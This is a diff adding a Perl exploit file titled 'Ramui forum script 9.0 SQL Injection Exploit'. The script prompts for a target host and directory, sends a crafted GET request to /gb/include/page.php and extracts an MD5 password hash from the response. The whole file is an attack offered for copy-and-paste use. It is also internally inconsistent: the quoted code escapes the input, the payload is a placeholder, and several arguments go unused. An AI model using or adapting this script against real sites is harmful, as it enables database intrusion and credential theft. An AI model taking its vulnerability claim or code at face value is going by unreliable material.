@@ -1,0 +1,96 @@
+# Title: Ramui forum script 9.0 SQL Injection Exploit
+# Author: bd0rk
+# Twitter: twitter.com/bd0rk
+# Vendor: http://www.ramui.com/
+# Download: http://ramui.com/forum-script/download-v9.html
+# Google-Dork: n/a --->Script-Kiddie protection! :)
+# Direct SQL-Path: n/a --->Script-Kiddie protection! :)
+
+# Description: I've found a sql-injection vulnerability in this web-software.
+#             The vulnerable code is in /gb/include/page.php
+#             The problem is the GET-pagename.
+#             An attacker can use this exploitcode for unfiltered sql-queries.
+
+                                      
+
+
+#                                                    Vuln-Code in /gb/include/page.php:
+#************************************************************************************************************************************
+# <?php
+# if(isset($_GET['pagename'])){
+#	$name=$_GET['pagename'];
+#	$query=sprintf("SELECT* FROM ".PREFIX."page WHERE pagename = '%s' AND publish = 'Y'",$xx_con->real_escape_string($name));
+# }
+#************************************************************************************************************************************
+
+
+
+# [+]PERL-EXPLOITCODE(Copy&Paste):
+
+
+#!/usr/bin/perl
+
+print q{
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
++                                                    +
++   Ramui forum script 9.0 SQL Injection Exploit     +
++                                                    +
++                  bd0rk || SOH-Crew                 +
++                                                    +
++            Greetings from cold Germany             +
++                                                    +
+++++++++++++++++++++++++++++++++++++++++++++++++++++++
+
+};
+
+use IO::Socket;
+
+print q{
+=> Insert URL
+=> without ( http )
+=> };
+$server = <STDIN>;
+chop ($server);
+print q{
+=> Insert directory
+=> es: /forum/ - /ramui/
+=> };
+$dir = <STDIN>;
+chop ($dir);
+print q{
+=> User ID
+=> Number:
+=> };
+$user = <STDIN>;
+chop ($user);
+if (!$ARGV[2]) {
+}
+$myuser = $ARGV[3];
+$mypass = $ARGV[4];
+$myid = $ARGV[5];
+$server =~ s/(http:\/\/)//eg;
+$path = $dir;
+$path .= "gb/include/page.php?pagename=[sqlInjectionCodeHERE]".$user ;
+print "
+=> Exploit in process...\r\n";
+$socket = IO::Socket::INET->new(
+Proto => "tcp",
+PeerAddr => "$server",
+PeerPort => "80") || die "Exploit failed";
+print "Exploit\r\n";
+print "in process...\r\n";
+print $socket "GET $path HTTP/1.1\r\n";
+print $socket "Host: $server\r\n";
+print $socket "Accept: */*\r\n";
+print $socket "Connection: close\r\n\r\n";
+print "Exploit finished!\r\n\r\n";
+while ($answer = <$socket>)
+{
+if ($answer =~/(\w{32})/)
+{
+if ($1 ne 0) {
+print "MD5-Hash is: ".$1."\r\n";
+}
+exit();
+}
+}
